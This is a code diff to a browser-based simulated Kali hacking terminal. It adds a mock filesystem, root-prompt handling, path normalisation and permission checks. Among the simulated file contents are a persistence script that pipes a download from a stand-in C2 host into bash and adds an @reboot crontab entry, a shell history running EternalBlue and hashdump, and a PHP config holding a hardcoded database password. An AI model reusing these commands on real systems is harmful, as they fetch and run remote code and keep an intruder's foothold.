@@ -4151,7 +4151,8 @@ function termPrintCmd(cmd) {
 }
 
 function termPromptStr() {
-  return `${TERM.user}@${TERM.host}:${TERM.path}$ `;
+  const sym = isRoot() ? '#' : '$';
+  return `${TERM.user}@${TERM.host}:${TERM.path}${sym} `;
 }
 
 function termUpdatePrompt() {
@@ -5511,15 +5512,33 @@ defCmd('ping', (args) => {
 const FS = {
   cwd: '/root',
   dirs: {
-    '/root': ['Desktop', 'Documents', 'Downloads', 'tools', '.ssh', '.bashrc', '.profile'],
-    '/root/tools': ['nmap', 'gobuster', 'hydra', 'sqlmap', 'enum4linux', 'nikto', 'linpeas.sh'],
-    '/root/Documents': ['report.txt', 'notes.md', 'targets.txt', 'creds.txt'],
-    '/root/Downloads': ['payload.py', 'shell.php', 'exploit.c', 'wordlist.txt'],
-    '/root/.ssh': ['id_rsa', 'id_rsa.pub', 'known_hosts', 'authorized_keys'],
-    '/etc': ['passwd', 'shadow', 'hosts', 'hostname', 'resolv.conf', 'crontab', 'sudoers'],
-    '/var/log': ['auth.log', 'syslog', 'kern.log', 'apache2', 'nginx'],
-    '/tmp': ['tmux-0', '.ICE-unix', 'f3a9b2c1.tmp'],
-    '/proc': ['version', 'cpuinfo', 'meminfo', 'net'],
+    '/':                 ['root', 'etc', 'var', 'tmp', 'proc', 'usr', 'bin', 'sbin', 'home', 'opt', 'dev', 'sys'],
+    '/root':             ['Desktop', 'Documents', 'Downloads', 'tools', '.ssh', '.bashrc', '.profile', '.bash_history'],
+    '/root/Desktop':     ['cybaash_notes.txt', 'target_list.txt', 'SCOPE.md'],
+    '/root/Documents':   ['report.txt', 'notes.md', 'targets.txt', 'creds.txt', 'engagement.md'],
+    '/root/Downloads':   ['payload.py', 'shell.php', 'exploit.c', 'wordlist.txt', 'linpeas.sh', 'chisel'],
+    '/root/tools':       ['nmap', 'gobuster', 'hydra', 'sqlmap', 'enum4linux', 'nikto', 'linpeas.sh', 'pspy64'],
+    '/root/.ssh':        ['id_rsa', 'id_rsa.pub', 'known_hosts', 'authorized_keys', 'config'],
+    '/etc':              ['passwd', 'shadow', 'hosts', 'hostname', 'resolv.conf', 'crontab', 'sudoers', 'fstab', 'os-release'],
+    '/etc/nginx':        ['nginx.conf', 'sites-enabled', 'sites-available'],
+    '/etc/apache2':      ['apache2.conf', 'sites-enabled', 'mods-enabled'],
+    '/var':              ['log', 'www', 'backups', 'spool', 'cache'],
+    '/var/log':          ['auth.log', 'syslog', 'kern.log', 'apache2', 'nginx', 'mysql', 'dpkg.log'],
+    '/var/www':          ['html'],
+    '/var/www/html':     ['index.php', 'config.php', 'admin', 'uploads', '.htaccess'],
+    '/var/www/html/admin': ['login.php', 'dashboard.php', 'config.php'],
+    '/tmp':              ['tmux-0', '.ICE-unix', 'f3a9b2c1.tmp', 'linpeas.sh', 'pspy64', '.hidden'],
+    '/tmp/.hidden':      ['persist.sh', 'backdoor.py', 'c2_config.json'],
+    '/proc':             ['version', 'cpuinfo', 'meminfo', 'net', 'self'],
+    '/usr':              ['bin', 'sbin', 'local', 'share', 'lib'],
+    '/usr/bin':          ['nmap', 'python3', 'curl', 'wget', 'nc', 'find', 'grep', 'awk', 'sed', 'sudo', 'su'],
+    '/usr/local':        ['bin', 'sbin', 'lib', 'share'],
+    '/usr/local/bin':    ['gobuster', 'sqlmap', 'hydra', 'enum4linux', 'linpeas.sh'],
+    '/opt':              ['metasploit-framework', 'wordlists', 'exploits'],
+    '/opt/metasploit-framework': ['msfconsole', 'msfvenom', 'modules'],
+    '/opt/wordlists':    ['rockyou.txt', 'fasttrack.txt', 'dirb', 'seclists'],
+    '/home':             ['kali', 'ubuntu', 'operator'],
+    '/home/kali':        ['.bashrc', '.profile', 'Desktop', 'Documents'],
   },
   files: {
     '/root/.bashrc': '# .bashrc\nexport PATH=$PATH:/usr/local/sbin:/usr/local/bin\nalias ll="ls -la"\nalias la="ls -A"\nexport TERM=xterm-256color\n',
@@ -5527,6 +5546,12 @@ const FS = {
     '/root/Documents/targets.txt': '10.0.0.1  WEB01  web-server\n10.0.0.2  DB01   database\n10.0.0.3  DC01   domain-controller\n10.0.0.4  FW01   firewall\n10.0.0.5  API01  api-gateway\n',
     '/etc/hosts': '127.0.0.1   localhost\n10.0.0.1    web01.cybaash.internal\n10.0.0.2    db01.cybaash.internal\n10.0.0.3    dc01.cybaash.internal\n10.0.0.100  kali.attacker\n',
     '/etc/hostname': 'cybaash-kali\n',
+    '/root/Desktop/SCOPE.md': '# Engagement Scope\n## Target: CYBAASH Internal Network\n## Authorized IPs: 10.0.0.0/24\n## Out of Scope: 10.0.0.254 (gateway)\n## Duration: 72 hours\n## Report Due: 2026-03-25\n',
+    '/root/Desktop/target_list.txt': '10.0.0.1  WEB01\n10.0.0.2  DB01\n10.0.0.3  DC01\n10.0.0.4  FW01\n10.0.0.5  API01\n10.0.0.6  CDN01\n10.0.0.7  WS01\n10.0.0.8  APP01\n10.0.0.9  VPN01\n',
+    '/root/.bash_history': 'nmap -sV -p- 10.0.0.0/24\nmsfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.0.0.3\nrun\nhashdump\ncd /tmp\nwget http://10.0.0.100:8080/linpeas.sh\nchmod +x linpeas.sh\n./linpeas.sh\n',
+    '/root/.ssh/config': 'Host dc01\n    HostName 10.0.0.3\n    User administrator\n    IdentityFile ~/.ssh/id_rsa\nHost web01\n    HostName 10.0.0.1\n    User www-data\n',
+    '/tmp/.hidden/persist.sh': '#!/bin/bash\n# Persistence mechanism\ncurl -s http://c2.attacker.local/check | bash\n(crontab -l 2>/dev/null; echo "@reboot /tmp/.hidden/persist.sh") | crontab -\n',
+    '/var/www/html/config.php': '<?php\n$DB_HOST = \"localhost\";\n$DB_USER = \"root\";\n$DB_PASS = \"Sup3rS3cr3t!\";  // TODO: move to env\n$DB_NAME = \"cybaash_prod\";\n?>\n',
     '/proc/version': 'Linux version 6.1.0-kali9-amd64 (devel@kali.org) (gcc-12 12.2.0) #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1kali1\n',
   },
   sessions: {},   // active nc/ssh sessions
@@ -5557,9 +5582,17 @@ const NET = {
 };
 
 const PRIV = {
-  level: 'user',   // user | sudo | root
+  level: 'user',   // user | root
   sudoAttempts: 0,
 };
+function isRoot() { return PRIV.level === 'root'; }
+function needsRoot(cmd) {
+  if (!isRoot()) {
+    termPrint({ t:'t-err', v:`${cmd}: Operation not permitted. Try: sudo ${cmd}` });
+    return true;
+  }
+  return false;
+}
 
 // ══════════════════════════════════════════════════════════════════════════════
 // WORKER API — real data from Cloudflare Worker endpoints
@@ -5604,9 +5637,11 @@ defCmd('ls', (args) => {
     });
   } else {
     const colored = entries.map(e => {
-      const isDir = !!FS.dirs[(path === FS.cwd ? FS.cwd : path) + '/' + e];
-      const color = isDir ? 'var(--blue)' : e.endsWith('.sh') || e.endsWith('.py') ? 'var(--green)' : 'var(--text)';
-      return `<span style="color:${color}">${e}</span>`;
+      const checkPath = (FS.dirs[path] ? path : FS.cwd) + '/' + e;
+      const isDir  = FS.dirs[checkPath] !== undefined;
+      const isExec = e.endsWith('.sh') || e.endsWith('.py') || e.endsWith('.pl') || !e.includes('.');
+      const color  = isDir ? 'var(--blue)' : isExec && !e.includes('.txt') && !e.includes('.md') && !e.includes('.conf') && !e.includes('.log') ? 'var(--green)' : 'var(--text)';
+      return `<span style="color:${color}">${e}${isDir ? '/' : ''}</span>`;
     });
     termPrint({ t:'t-out', v: colored.join('  ') });
   }
@@ -5615,13 +5650,33 @@ defCmd('ls', (args) => {
 // ── cd ────────────────────────────────────────────────────────────────────────
 defCmd('cd', (args) => {
   const target = args[0] || '/root';
-  const resolved = target.startsWith('/') ? target : FS.cwd + '/' + target;
-  const normalized = resolved.replace(/\/\//g, '/').replace(/\/\.$/, '').replace(/\/[^/]+\/\.\.$/, '');
+  // Build resolved path
+  let resolved;
+  if (target === '~' || target === '') {
+    resolved = '/root';
+  } else if (target === '-') {
+    resolved = FS.prevCwd || '/root';
+  } else if (target.startsWith('/')) {
+    resolved = target;
+  } else {
+    resolved = FS.cwd + '/' + target;
+  }
+  // Normalize: collapse // and resolve .. and .
+  const parts = resolved.split('/').filter(Boolean);
+  const stack = [];
+  for (const p of parts) {
+    if (p === '..') { stack.pop(); }
+    else if (p !== '.') { stack.push(p); }
+  }
+  const normalized = '/' + stack.join('/');
   if (FS.dirs[normalized] !== undefined) {
+    FS.prevCwd = FS.cwd;
     FS.cwd = normalized;
+    // Sync terminal prompt path display
+    TERM.path = normalized.replace('/root', '~') || '~';
     termUpdatePrompt();
   } else {
-    termPrint({ t:'t-err', v:`bash: cd: ${target}: No such file or directory` });
+    termPrint({ t:'t-err', v:`bash: cd: ${sanitizeText(target)}: No such file or directory` });
   }
 });
 
@@ -5663,8 +5718,10 @@ defCmd('sudo', (args) => {
   }
   if (args[0] === 'su' || (args[0] === '-' ) || (args[0] === 'bash') || (args[0] === 'sh')) {
     PRIV.level = 'root';
+    TERM.user = 'root';
+    TERM.path = FS.cwd.replace('/root', '~') || '~';
     termUpdatePrompt();
-    termPrint({ t:'t-def', v:'root@cybaash:~# ' });
+    termPrint({ t:'t-def', v:`root@cybaash:${TERM.path}# ` });
     return;
   }
   PRIV.sudoAttempts++;
@@ -5675,7 +5732,10 @@ defCmd('sudo', (args) => {
   }
   termPrint({ t:'t-out', v:'[sudo] password for kali: ' });
   setTimeout(() => {
-    PRIV.level = 'sudo';
+    PRIV.level = 'root';
+    TERM.user = 'root';
+    TERM.host = 'cybaash';
+    TERM.path = FS.cwd.replace('/root', '~') || '~';
     if (args.length) termExec(args.join(' '));
     termUpdatePrompt();
   }, 600);
@@ -5687,8 +5747,10 @@ defCmd('su', (args) => {
   termPrint({ t:'t-out', v:`Password: ` });
   setTimeout(() => {
     PRIV.level = 'root';
+    TERM.user = 'root';
+    TERM.path = FS.cwd.replace('/root', '~') || '~';
     termUpdatePrompt();
-    termPrint({ t:'t-def', v:`root@cybaash:/root#` });
+    termPrint({ t:'t-def', v:`root@cybaash:${TERM.path}#` });
   }, 500);
 });
 
@@ -6190,7 +6252,7 @@ defCmd('wget', (args) => {
 
 // ── tcpdump ───────────────────────────────────────────────────────────────────
 defCmd('tcpdump', (args) => {
-  if (PRIV.level === 'user') { termPrint({ t:'t-err', v:'tcpdump: eth0: You don\'t have permission to capture on that device (socket: Operation not permitted). Use sudo.' }); return; }
+  if (needsRoot('tcpdump')) return;
   const iface  = args.find(a => args[args.indexOf(a)-1] === '-i') || 'eth0';
   const filter = args.find(a => ['tcp','udp','icmp','port','host','net'].some(k => a.startsWith(k))) || '';
   termPrint({ t:'t-out', v:`tcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on ${iface}, link-type EN10MB (Ethernet), snapshot length 262144 bytes` });
@@ -6208,7 +6270,7 @@ defCmd('tcpdump', (args) => {
 
 // ── iptables ──────────────────────────────────────────────────────────────────
 defCmd('iptables', (args) => {
-  if (PRIV.level === 'user') { termPrint({ t:'t-err', v:'iptables: Operation not permitted. Use sudo.' }); return; }
+  if (needsRoot('iptables')) return;
   const flag = args[0];
   if (flag === '-L' || flag === '--list') {
     termPrint({ t:'t-out', v:`Chain INPUT (policy ACCEPT)\ntarget     prot opt source               destination\nACCEPT     all  --  anywhere             anywhere             state RELATED,ESTABLISHED\nACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh\nDROP       tcp  --  10.0.0.0/24          anywhere             tcp dpt:4444\n\nChain FORWARD (policy DROP)\n\nChain OUTPUT (policy ACCEPT)` });
@@ -6682,7 +6744,7 @@ defCmd('file', (args) => {
 
 // ── strace ────────────────────────────────────────────────────────────────────
 defCmd('strace', (args) => {
-  if (PRIV.level === 'user') { termPrint({ t:'t-err', v:'strace: Permission denied. Use sudo.' }); return; }
+  if (needsRoot('strace')) return;
   const prog = args.find(a => !a.startsWith('-')) || 'ls';
   const calls = ['execve','read','write','open','close','stat','fstat','mmap','mprotect','munmap','brk','rt_sigaction','ioctl'];
   termPrint({ t:'t-dim', v:`execve("${sanitizeText(prog)}", ["${sanitizeText(prog)}"], 0x7ffe... /* 23 vars */) = 0` });
